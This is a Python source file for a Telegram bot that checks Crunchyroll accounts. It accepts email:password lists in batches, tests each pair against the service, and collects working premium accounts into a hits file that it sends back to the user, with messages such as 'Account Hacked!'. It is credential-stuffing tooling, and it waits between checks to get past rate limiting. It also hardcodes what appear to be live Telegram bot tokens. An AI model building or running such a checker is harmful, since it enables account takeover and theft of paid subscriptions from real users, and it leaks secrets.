import os
import logging
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
from Crunchyroll import check_crunchyroll_account
import asyncio

# Enable logging
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# Owner ID with special privileges
OWNER_ID = 8205043063

# Bot mode: True for private (owner only), False for public
PRIVATE_MODE = False

# Global stats
stats = {
    "total_checks": 0,
    "successful_hits": 0,
    "failed_logins": 0
}

# Track active users
active_users = set()

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if PRIVATE_MODE and update.effective_user.id != OWNER_ID:
        await update.message.reply_text("Access denied. This bot is for owner only.")
        return
    # Track active user
    active_users.add(update.effective_user.id)
    keyboard = [
        [InlineKeyboardButton("🔍 Check Single Account", callback_data='check')],
        [InlineKeyboardButton("📦 Multi Check Accounts", callback_data='batch')],
        [InlineKeyboardButton("📊 View Stats", callback_data='stats')],
        [InlineKeyboardButton("👤 Contact Owner", url='https://t.me/botZenin')],
        [InlineKeyboardButton("❓ Help", callback_data='help')]
    ]
    if update.effective_user.id == OWNER_ID:
        keyboard.append([InlineKeyboardButton("⚙️ Settings", callback_data='settings')])
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        """🖥️  WELCOME — CRUNCHYROLL CHECKER BOT
======================================
🔥 Premium Account Checker — Ready
======================================
Select an option to start. Please act responsibly and respect account security.""",
        reply_markup=reply_markup
    )

async def check(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if PRIVATE_MODE and update.effective_user.id != OWNER_ID:
        await update.message.reply_text("Access denied. This bot is for owner only.")
        return
    global stats
    if not context.args:
        await update.message.reply_text("Usage: /check email:pass")
        return

    creds = ' '.join(context.args)
    if ':' not in creds:
        await update.message.reply_text("Invalid format. Use /check email:pass")
        return

    user, pasw = creds.split(':', 1)
    stats["total_checks"] += 1

    # Send initial loading message
    loading_msg = await update.message.reply_text("🔍 [PRO CHECKER MODE] Checking Crunchyroll Account...\n[░░░░░░░░░░░░░░░░░░░░] 0%")

    # Simulate progress (optional, for effect)
    import asyncio
    for i in range(1, 11):
        progress = "█" * i + "░" * (10 - i)
        await loading_msg.edit_text(f"🔍 [PRO CHECKER MODE] Checking Crunchyroll Account...\n[{progress}] {i*10}%")
        await asyncio.sleep(0.1)

    result = check_crunchyroll_account(user, pasw)

    if result["status"] == "success":
        stats["successful_hits"] += 1
        response = (
            f"```\n✅ [SUCCESS] Account Hacked!\n"
            f"Email Verified: {result['email_verified']}\n"
            f"Status: {result['account_status']}\n"
            f"Country: {result['country']}\n"
            f"Active Subscription: {result['active_subscription']}\n"
            f"Plan: {result['plan']}\n"
            f"Expiry Date: {result['expiry_date']}\n"
            f"Days Remaining: {result['days_remaining']}\n```"
        )
        if result['account_status'] == 'PREMIUM':
            with open('hits.txt', 'a') as f:
                f.write(f"{user}:{pasw} | Status: {result['account_status']} | Plan: {result['plan']} | Expiry: {result['expiry_date']} | Days Left: {result['days_remaining']}\n")
    elif result["status"] == "failed":
        stats["failed_logins"] += 1
        response = f"❌ [FAILED] Login Error: {result['error']}"
    else:
        response = "⚠️ [UNKNOWN] Unexpected Response"

    await loading_msg.edit_text(response)

async def batch(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if PRIVATE_MODE and update.effective_user.id != OWNER_ID:
        await update.message.reply_text("Access denied. This bot is for owner only.")
        return
    await update.message.reply_text("Send the list of accounts (up to 20, one per line as email:pass)")

    # Set a flag to expect the batch message
    context.user_data['awaiting_batch'] = True

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if PRIVATE_MODE and update.effective_user.id != OWNER_ID:
        await update.message.reply_text("Access denied. This bot is for owner only.")
        return
    if context.user_data.get('awaiting_batch'):
        accounts = update.message.text.strip().split('\n')
        if len(accounts) > 20:
            await update.message.reply_text("Too many accounts. Max 20.")
            context.user_data['awaiting_batch'] = False
            return

        global stats
        successful_hits = []
        failed = 0
        total = len(accounts)

        # Send initial batch loading message
        loading_msg = await update.message.reply_text(f"🔍 [PRO CHECKER MODE] MULTI Checking {total} Accounts...\n[░░░░░░░░░░░░░░░░░░░░] 0%")

        for idx, creds in enumerate(accounts):
            creds = creds.strip()
            if ':' not in creds:
                failed += 1
                continue
            user, pasw = creds.split(':', 1)
            stats["total_checks"] += 1
            try:
                result = check_crunchyroll_account(user, pasw)
                if result.get("status") == "success":
                    stats["successful_hits"] += 1
                    if result.get('account_status') == 'PREMIUM':
                        successful_hits.append(f"{user}:{pasw} | Status: {result.get('account_status', 'N/A')} | Plan: {result.get('plan', 'N/A')} | Expiry: {result.get('expiry_date', 'N/A')} | Days Left: {result.get('days_remaining', 'N/A')}")
                else:
                    failed += 1
            except Exception as e:
                logger.error(f"Error checking account {user}: {e}")
                failed += 1

            # Update progress
            progress = int((idx + 1) / total * 20)
            bar = "█" * progress + "░" * (20 - progress)
            await loading_msg.edit_text(f"🔍 [PRO CHECKER MODE] Batch Checking {total} Accounts...\n[{bar}] {int((idx + 1) / total * 100)}%")
            await asyncio.sleep(1.0)  # Delay to avoid rate limiting

        # Save hits to file
        if successful_hits:
            with open('hits.txt', 'w') as f:
                for hit in successful_hits:
                    f.write(hit + '\n')
            # Send the file
            await update.message.reply_document(document=open('hits.txt', 'rb'), filename='hits.txt')

        response = f"✅ [MULTI COMPLETE] Hacking Session Finished!\nTotal: {total}\nSuccessful Hits: {len(successful_hits)}\nFailed: {failed}"
        await loading_msg.edit_text(response)
        context.user_data['awaiting_batch'] = False

async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if PRIVATE_MODE and update.effective_user.id != OWNER_ID:
        await update.message.reply_text("Access denied. This bot is for owner only.")
        return
    success_rate = (stats['successful_hits'] / stats['total_checks'] * 100) if stats['total_checks'] > 0 else 'N/A'
    response = (
        f"📊 [HACKER STATS] System Report\n"
        f"===================================\n"
        f"Total Checks: {stats['total_checks']}\n"
        f"Successful Hits: {stats['successful_hits']}\n"
        f"Failed Logins: {stats['failed_logins']}\n"
        f"Success Rate: {success_rate:.2f}%"
    )
    await update.message.reply_text(response)

async def private_mode(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("Access denied. Only owner can change bot mode.")
        return
    global PRIVATE_MODE
    PRIVATE_MODE = True
    await update.message.reply_text("Bot mode set to PRIVATE. Only owner can use the bot.")

async def public_mode(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("Access denied. Only owner can change bot mode.")
        return
    global PRIVATE_MODE
    PRIVATE_MODE = False
    await update.message.reply_text("Bot mode set to PUBLIC. Anyone can use the bot.")

async def users_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("Access denied. Only owner can view users.")
        return
    total_users = len(active_users)
    bot_mode = "PRIVATE" if PRIVATE_MODE else "PUBLIC"
    response = (
        f"👥 [ACTIVE USERS] Bot Status Report\n"
        f"=====================================\n"
        f"Total Active Users: {total_users}\n"
        f"Bot Mode: {bot_mode}\n"
        f"Owner ID: {OWNER_ID}"
    )
    await update.message.reply_text(response)

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    global PRIVATE_MODE
    query = update.callback_query
    await query.answer()
    if PRIVATE_MODE and query.from_user.id != OWNER_ID:
        await query.edit_message_text("Access denied. This bot is for owner only.")
        return

    if query.data == 'check':
        await query.edit_message_text(
            """🔍 [SINGLE CHECK MODE]
Use: /check email:pass
Example: /check user@example.com:password123"""
        )
    elif query.data == 'batch':
        await query.edit_message_text(
            "📦 [MULTI CHECK MODE]\n"
            "Use: /batch\n"
            "Then send accounts as:\n"
            "email1:pass1\n"
            "email2:pass2\n"
            "(Max 20 accounts)"
        )
    elif query.data == 'stats':
        success_rate = (stats['successful_hits'] / stats['total_checks'] * 100) if stats['total_checks'] > 0 else 'N/A'
        response = (
            f"📊 [CHECKER STATS] System Report\n"
            f"===================================\n"
            f"Total Checks: {stats['total_checks']}\n"
            f"Successful Hits: {stats['successful_hits']}\n"
            f"Failed Logins: {stats['failed_logins']}\n"
            f"Success Rate: {success_rate:.2f}%"
        )
        await query.edit_message_text(response)

    elif query.data == 'settings':
        if query.from_user.id != OWNER_ID:
            await query.edit_message_text("Access denied. Only owner can access settings.")
            return
        settings_keyboard = [
            [InlineKeyboardButton("🔒 Set Private Mode", callback_data='set_private')],
            [InlineKeyboardButton("🌐 Set Public Mode", callback_data='set_public')],
            [InlineKeyboardButton("👥 View Users", callback_data='view_users')],
            [InlineKeyboardButton("⬅️ Back to Main Menu", callback_data='back_main')]
        ]
        reply_markup = InlineKeyboardMarkup(settings_keyboard)
        await query.edit_message_text(
            "⚙️ [OWNER SETTINGS] Bot Configuration\n"
            "=====================================\n"
            "Select an option to configure the bot:\n"
            "• Private Mode: Only you can use the bot\n"
            "• Public Mode: Anyone can use the bot\n"
            "• View Users: See active user count",
            reply_markup=reply_markup
        )
    elif query.data == 'set_private':
        if query.from_user.id != OWNER_ID:
            await query.edit_message_text("Access denied.")
            return
        PRIVATE_MODE = True
        await query.edit_message_text("✅ Bot mode set to PRIVATE. Only owner can use the bot.")
    elif query.data == 'set_public':
        if query.from_user.id != OWNER_ID:
            await query.edit_message_text("Access denied.")
            return
        PRIVATE_MODE = False
        await query.edit_message_text("✅ Bot mode set to PUBLIC. Anyone can use the bot.")
    elif query.data == 'view_users':
        if query.from_user.id != OWNER_ID:
            await query.edit_message_text("Access denied.")
            return
        total_users = len(active_users)
        bot_mode = "PRIVATE" if PRIVATE_MODE else "PUBLIC"
        response = (
            f"👥 [ACTIVE USERS] Bot Status Report\n"
            f"=====================================\n"
            f"Total Active Users: {total_users}\n"
            f"Bot Mode: {bot_mode}\n"
            f"Owner ID: {OWNER_ID}"
        )
        await query.edit_message_text(response)
    elif query.data == 'back_main':
        keyboard = [
            [InlineKeyboardButton("🔍 Check Single Account", callback_data='check')],
            [InlineKeyboardButton("📦 Multi Check Accounts", callback_data='batch')],
            [InlineKeyboardButton("📊 View Stats", callback_data='stats')],
            [InlineKeyboardButton("👤 Contact Owner", url='https://t.me/botZenin')],
            [InlineKeyboardButton("❓ Help", callback_data='help')]
        ]
        if query.from_user.id == OWNER_ID:
            keyboard.append([InlineKeyboardButton("⚙️ Settings", callback_data='settings')])
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(
            """🖥️  WELCOME — CRUNCHYROLL CHECKER BOT
======================================
🔥 Premium Account Checker — Ready
======================================
Select an option to start. Please act responsibly and respect account security.""",
            reply_markup=reply_markup
        )
    elif query.data == 'help':
        help_text = (
            "❓ [HELP] Command Guide\n"
            "========================\n"
            "/start - Start the bot and show menu\n"
            "/check email:pass - Check a single account\n"
            "/batch - Check multiple accounts (send list after)\n"
            "/stats - View checking statistics\n"
        )
        if query.from_user.id == OWNER_ID:
            help_text += (
                "/users - View active users\n"
                "/private - Set bot to private mode\n"
                "/public - Set bot to public mode\n"
                "Or use the Settings button in the menu.\n"
            )
        else:
            help_text += "Use buttons or type commands directly.\n"
        await query.edit_message_text(help_text)

def main():
    # Bot tokens provided
    tokens = ["8269523409:AAE2DO6L_Xl-9X00R6_1qZ3woCW2LBFL89g", "7671782649:AAGGKdjl9gKZBhDd-Dw_NGku2tFOW0avkB8"]
    token = tokens[0]  # Use the first token, can switch to tokens[1] if needed

    application = ApplicationBuilder().token(token).build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("check", check))
    application.add_handler(CommandHandler("batch", batch))
    application.add_handler(CommandHandler("stats", stats_command))
    application.add_handler(CommandHandler("users", users_command))
    application.add_handler(CommandHandler("private", private_mode))
    application.add_handler(CommandHandler("public", public_mode))
    application.add_handler(CallbackQueryHandler(button_handler))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

    application.run_polling()

if __name__ == '__main__':
    main()
